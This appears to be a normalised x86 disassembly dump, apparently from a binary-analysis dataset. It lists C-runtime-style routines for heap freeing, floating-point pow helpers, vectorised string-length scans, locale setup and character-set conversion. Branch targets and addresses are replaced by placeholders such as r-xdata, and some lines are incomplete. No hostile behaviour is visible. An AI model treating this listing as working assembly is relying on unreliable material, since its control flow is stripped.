mov [ ebp - 0x14 ] esi
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
mov edx [ ecx + 0x4 ]
mov ecx [ ecx ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] ecx
jbe r-xdata
add ecx 0xffffffff
mov [ ebx ] ecx
jne r-xdata
push 0x0
push [ ebp - 0x34 ]
add ebx 0x1
adc eax 0xffffffff
push eax
push ebx
call sub_4297f0
add edi eax
adc esi edx
or ebx 0xffffffff
xor eax eax
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x40 ] eax
cmp ebx 0xffffffff
jbe r-xdata
mov eax [ ebp - 0x38 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x3c ]
mov eax [ ebx + eax * 4 - 0x8 ]
shr eax cl
or esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] esi
test eax eax
jne r-xdata
jb r-xdata
test esi esi
ja r-xdata
mov ecx [ ebp - 0x38 ]
xor edi edi
xor esi esi
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
push eax
push ebx
xor ecx ecx
mov esi edi
or ecx [ ebp - 0x14 ]
push 0x0
push [ ebp - 0x20 ]
mov [ ebp - 0x4 ] ecx
call sub_4297f0
cmp edx esi
jb r-xdata
cmp edi 0xffffffff
ja r-xdata
xor eax eax
cmp eax esi
ja r-xdata
mov eax [ ebp + 0xc ]
mov ebx [ ebp - 0x10 ]
add eax 0x4
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] ecx
mov esi [ ebp - 0x48 ]
xor eax eax
mov edx [ ebp - 0x1c ]
add eax ebx
mov ecx [ ebp - 0x4c ]
mov edi eax
mov eax [ ebp - 0x8 ]
adc esi 0x0
sub [ ebp - 0x10 ] 0x4
dec edx
mov ebx [ ebp + 0x8 ]
sub ecx 0x4
dec eax
mov [ ebp - 0x48 ] edi
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x8 ] eax
test edx edx
jns r-xdata
mov eax [ ebp - 0x18 ]
ja r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov [ ebp - 0xc ] eax
jb r-xdata
sub eax ecx
mov [ ebx ] eax
add ebx 0x4
mov eax [ ebp - 0x14 ]
add eax 0x4
sub [ ebp - 0xc ] 0x1
mov [ ebp - 0x14 ] eax
jne r-xdata
add edi 0x1
adc esi esi
cmp eax [ ebp - 0xc ]
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
add ebx 0xffffffff
mov [ ebp - 0x44 ] ebx
adc eax 0xffffffff
add edi [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
adc [ ebp - 0x28 ] 0x0
mov [ ebp - 0x40 ] eax
jne r-xdata
cmp eax [ ebp - 0x4 ]
jbe r-xdata
test ecx ecx
je r-xdata
cmp [ ebp - 0x30 ] edi
jae r-xdata
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x40 ]
mul [ ebp - 0x28 ]
mov ecx eax
mov eax [ ebp - 0x44 ]
mul [ ebp - 0x28 ]
add edx ecx
add edi eax
mov eax [ ebx ]
mov ecx edi
adc esi edx
mov edi esi
xor esi esi
cmp eax ecx
jae r-xdata
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0xc ]
inc edx
mov eax edx
cmp eax [ ebx ]
jae r-xdata
mov [ ebp - 0x4 ] ebx
cmp edi 0xffffffff
jbe r-xdata
add ebx 0xffffffff
adc [ ebp - 0x18 ] 0xffffffff
mov esi [ ebp + 0xc ]
mov edi ecx
mov edx [ ebp - 0x10 ]
add esi 0x4
mov ebx eax
lea esp [ esp ]
jmp r-xdata
mov ecx [ edx ]
lea esi [ esi + 0x4 ]
xor eax eax
lea edx [ edx + 0x4 ]
add ecx [ esi - 0x4 ]
adc eax eax
add ecx ebx
mov [ edx - 0x4 ] ecx
adc eax 0x0
mov ebx eax
sub edi 0x1
jne r-xdata
mov ebx [ ebp - 0x4 ]
sub_41a0b0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_41a100
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ esp + 0xc ]
call sub_424a35
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_423a89
sub_41a140
cmp [ rw-data ] 0x0
je r-xdata
sub esp 0x14
fxch st1
fstp [ esp ]
fst [ esp + 0x8 ]
mov eax [ esp + 0xc ]
call sub_41a19d
add esp 0x14
retn
sub esp 0x8
stmxcsr [ esp + 0x4 ]
mov eax [ esp + 0x4 ]
and eax 0x7f80
cmp eax 0x1f80
jne r-xdata
lea esp [ esp + 0x8 ]
jne r-xdata
fnstcw [ esp ]
mov ax [ esp ]
and ax 0x7f
cmp ax 0x7f
jmp sub_423a70
sub_41a19d
mov ecx eax
push eax
fwait
fnstcw [ esp ]
cmp [ esp ] 0x27f
je r-xdata
and ecx 0x7ff00000
lea edx [ esp + 0x8 ]
cmp ecx 0x7ff00000
je r-xdata
call sub_424a05
xor ecx ecx
and eax 0xfffff
or eax [ esp + 0x10 ]
jne r-xdata
call sub_424a35
je r-xdata
lea edx [ esp + 0x8 ]
call sub_424a35
fld1
fucomip st1
jpe r-xdata
lea edx [ esp + 0x8 ]
call sub_424a35
xor ecx ecx
jmp r-xdata
test eax 0x7ff00000
je r-xdata
fxch st1
fxam
fwait
fnstsw ax
fwait
sahf
jne r-xdata
je r-xdata
test ecx ecx
jne r-xdata
or edx [ esp + 0x8 ]
jne r-xdata
mov eax [ esp + 0xc ]
mov edx eax
and eax 0x7ff00000
and edx 0xfffff
cmp eax 0x7ff00000
jne r-xdata
mov eax [ esp + 0xc ]
and eax 0xfffff
or eax [ esp + 0x8 ]
jne r-xdata
mov cl [ esp + 0xf ]
and cl 0x80
jne r-xdata
faddp st1
pop edx
retn
fstp st0
fstp st0
fld1
pop edx
retn
inc ecx
jmp r-xdata
sub esp 0x74
mov ecx esp
push ecx
sub esp 0x10
fstp [ esp ]
fstp [ esp + 0x8 ]
fwait
fnsave [ ecx + 0x8 ]
call sub_424be6
add esp 0x10
pop ecx
frstor [ ecx + 0x8 ]
fld [ ecx ]
add esp 0x74
test eax eax
je r-xdata
fstp st0
mov eax [ esp + 0x14 ]
and eax 0x7fffffff
or eax [ esp + 0x10 ]
je r-xdata
fld st1
call sub_41a361
fchs
test cl cl
jne r-xdata
fyl2x
call sub_4249f0
cmp cl 0x1
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
mov eax 0x1
jmp r-xdata
fstp st0
fld1
jmp r-xdata
call sub_41a361
mov ch [ esp + 0xf ]
shr ch 0x7
test [ esp + 0x17 ] 0x80
je r-xdata
fstp st0
fstp st0
fld [ r--data ]
mov eax 0x1
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
fchs
pop edx
retn
fldcw [ esp ]
cmp [ rw-data ] 0x0
jne r-xdata
fldz
test ch cl
je r-xdata
fld [ r--data ]
test ch cl
je r-xdata
lea ecx [ r--data ]
mov edx 0x1d
jmp r-xdata
lea ecx [ r--data ]
mov edx 0x1d
call sub_424990
pop edx
retn
fchs
jmp r-xdata
mov eax 0x2
jmp r-xdata
fchs
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x4
jae r-xdata
cmp eax 0x7ff00000
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
call sub_424990
pop edx
retn
call sub_4249a7
pop edx
retn
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_41a361
fld st0
frndint
fcomp st1
mov cl 0x0
fwait
fnstsw ax
sahf
jne r-xdata
fstp st0
retn
fmul [ r--data ]
inc cl
fld st0
frndint
fcompp
fwait
fnstsw ax
sahf
jne r-xdata
retn
inc cl
sub_41a389
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
cmp [ ecx ] al
je r-xdata
pop ebp
retn
cmp eax [ ebp + 0xc ]
je r-xdata
inc eax
cmp [ eax + ecx ] 0x0
jne r-xdata
sub_41a3a5
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_41529e
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_415225
pop ecx
mov [ esi ] eax
pop esi
sub_41a3df
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
test edx edx
je r-xdata
call sub_41529e
push 0x16
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push edi
mov edi edx
sub esi edx
xor eax eax
mov [ edx ] ax
pop edi
test ecx ecx
jne r-xdata
sub ecx 0x1
jne r-xdata
xor esi esi
jmp r-xdata
xor eax eax
mov [ edx ] ax
call sub_41529e
push 0x22
jmp r-xdata
movzx eax [ esi + edi ]
mov [ edi ] ax
lea edi [ edi + 0x2 ]
test ax ax
je r-xdata
mov eax esi
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_413b01
sub_41a443
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0x1f
push 0x20
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
mov edx [ ebp + 0x8 ]
mov ecx edx
mov eax [ ebp + 0xc ]
add eax edx
cmp edx eax
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0xf
push 0x10
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx edx
cmp [ ecx ] 0x0
je r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc ecx
cmp ecx eax
jne r-xdata
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop edi
mov eax ecx
pop esi
pop ebp
retn
mov edi eax
add ecx esi
sub edi edx
mov eax edi
and eax 0x1f
sub edi eax
vxorps ymm1 ymm1 ymm1
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
mov edi eax
add ecx esi
sub edi edx
pxor xmm1 xmm1
mov eax edi
and eax 0xf
sub edi eax
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
vpcmpeqb ymm0 ymm1 [ ecx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
movaps xmm0 [ ecx ]
pcmpeqb xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x20
cmp ecx eax
jne r-xdata
add ecx 0x10
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
vzeroupper
jmp r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
jmp r-xdata
inc ecx
inc ecx
sub_41a56a
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
test cl 0x1
je r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
test cl 0x1
je r-xdata
mov esi ecx
and esi 0x1f
push 0x20
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
sub edx ecx
xor edi edi
mov esi ecx
and esi 0xf
push 0x10
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
add edx 0x2
cmp edx eax
jne r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
pop edi
mov eax edx
pop esi
mov esp ebp
pop ebp
retn
lea edx [ ecx + edx * 2 ]
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0x1f
sub ecx eax
vxorps ymm1 ymm1 ymm1
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
lea edx [ ecx + edx * 2 ]
pxor xmm1 xmm1
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0xf
sub ecx eax
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
cmp edx ecx
jne r-xdata
cmp edx ecx
jne r-xdata
vpcmpeqw ymm0 ymm1 [ edx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
movaps xmm0 [ edx ]
pcmpeqw xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x20
cmp edx ecx
jne r-xdata
add edx 0x10
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
vzeroupper
jmp r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
jmp r-xdata
add edx 0x2
add edx 0x2
sar edx 0x1
sub_41a721
push 0x8
push r--data
call sub_40e2a0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x4 ]
mov eax [ eax ]
push [ eax ]
mov eax [ ecx ]
push [ eax ]
call sub_41aa48
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a765
call sub_40e2e6
retn 0xc
sub_41a771
push 0x8
push r--data
call sub_40e2a0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov ecx [ eax + 0x48 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a7c6
call sub_40e2e6
retn 0xc
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
cmp ecx rw-data
je r-xdata
push ecx
call sub_41a3a5
pop ecx
sub_41a7d2
push 0x8
push r--data
call sub_40e2a0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
push [ eax ]
call sub_41aa48
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a811
call sub_40e2e6
retn 0xc
sub_41a81d
push 0x8
push r--data
call sub_40e2a0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41a859
call sub_40e2e6
retn 0xc
sub_41a865
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41a771
mov esp ebp
pop ebp
retn
sub_41a88d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41a721
mov esp ebp
pop ebp
retn
sub_41a8b5
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41a7d2
mov esp ebp
pop ebp
retn
sub_41a8dd
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41a81d
mov esp ebp
pop ebp
retn
sub_41a905
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
inc ecx
push 0x43
mov [ eax + 0x18 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax ] r--data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x350 ] ecx
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax + 0x48 ] rw-data
mov eax [ ebp + 0x8 ]
mov [ eax + 0x6c ] cx
mov eax [ ebp + 0x8 ]
mov [ eax + 0x172 ] cx
mov eax [ ebp + 0x8 ]
and [ eax + 0x34c ] 0x0
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x5
call sub_41a8dd
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_41a88d
add esp 0x10
mov esp ebp
pop ebp
retn
sub_41a97e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push [ ebp + 0x8 ]
call sub_41a99f
push [ ebp + 0x8 ]
call sub_41a3a5
pop ecx
pop ecx
sub_41a99f
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp ecx r--data
je r-xdata
push [ eax + 0x3c ]
call sub_41a3a5
mov eax [ ebp + 0x8 ]
push [ eax + 0x30 ]
call sub_41a3a5
mov eax [ ebp + 0x8 ]
push [ eax + 0x34 ]
call sub_41a3a5
mov eax [ ebp + 0x8 ]
push [ eax + 0x38 ]
call sub_41a3a5
mov eax [ ebp + 0x8 ]
push [ eax + 0x28 ]
call sub_41a3a5
mov eax [ ebp + 0x8 ]
push [ eax + 0x2c ]
call sub_41a3a5
mov eax [ ebp + 0x8 ]
push [ eax + 0x40 ]
call sub_41a3a5
mov eax [ ebp + 0x8 ]
push [ eax + 0x44 ]
call sub_41a3a5
mov eax [ ebp + 0x8 ]
push [ eax + 0x360 ]
call sub_41a3a5
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x5
call sub_41a865
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x4
call sub_41a8b5
add esp 0x34
mov esp ebp
pop ebp
retn
push ecx
call sub_41a3a5
mov eax [ ebp + 0x8 ]
pop ecx
sub_41aa48
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x4c ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov [ esi + 0x4c ] eax
pop esi
test eax eax
je r-xdata
push [ esi + 0x4c ]
call sub_420b90
mov eax [ esi + 0x4c ]
pop ecx
cmp eax [ rw-data ]
je r-xdata
pop ebp
retn
push eax
call sub_420947
pop ecx
cmp eax rw-data
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
push eax
call sub_4209c4
pop ecx
sub_41aa93
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_41942e
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_41bfe4
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_41c03a
test eax eax
jne r-xdata
push eax
push esi
call [ SetLastError@IAT ]
mov eax edi
pop edi
pop esi
retn
push rw-data
push edi
call sub_41a905
push 0x0
call sub_41a3a5
add esp 0xc
test edi edi
je r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
call sub_419afb
call sub_41a3a5
pop ecx
jmp r-xdata
sub_41ab17
mov edi edi
push ebx
push esi
push edi
call [ GetLastError@IAT ]
mov esi eax
xor ebx ebx
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push 0x364
push 0x1
call sub_41942e
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
push eax
call sub_41bfe4
mov edi eax
test edi edi
jne r-xdata
push edi
push [ rw-data ]
call sub_41c03a
test eax eax
jne r-xdata
push ebx
push esi
call [ SetLastError@IAT ]
mov ebx edi
push rw-data
push edi
call sub_41a905
push ebx
call sub_41a3a5
add esp 0xc
test edi edi
jne r-xdata
push edi
jmp r-xdata
push esi
call [ SetLastError@IAT ]
jmp r-xdata
call sub_41a3a5
pop ecx
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn
sub_41ab9c
push sub_41a97e
call sub_41bf38
mov [ rw-data ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_41ab17
test eax eax
jne r-xdata
xor al al
retn
mov al 0x1
retn
push eax
call sub_41abc8
pop ecx
jmp r-xdata
sub_41abe2
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4156ae
add esp 0xc
push 0x0
call sub_4156c9
add esp 0x14
mov esp ebp
pop ebp
retn
sub_41ac0e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_414048
mov eax [ ebp - 0xc ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
movzx eax [ esi ]
push eax
call sub_41de1d
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
inc edi
push edi
push esi
push 0x9
push [ eax + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0xc ]
cmp [ edi + 0x4 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_41529e
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x4 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x4 ]
push esi
push 0x9
push [ edi + 0x8 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0xc ]
test eax eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ edi + 0x4 ]
jmp r-xdata
sub_41ad22
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x14 ]
call sub_414048
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
push [ eax + 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_41529e
push 0x2a
pop esi
mov [ eax ] esi
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
call sub_41529e
push 0x22
pop esi
mov [ eax ] esi
call sub_413b01
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_411230
add esp 0xc
push edi
push esi
push ebx
call sub_411230
add esp 0xc
sub_41ae60
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x350 ] eax
jne r-xdata
call sub_420c11
mov [ esi ] eax
sub_41ae8d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x350 ] eax
jne r-xdata
call sub_41eadb
mov [ esi ] eax
sub_41aeba
mov edi edi
push ebp
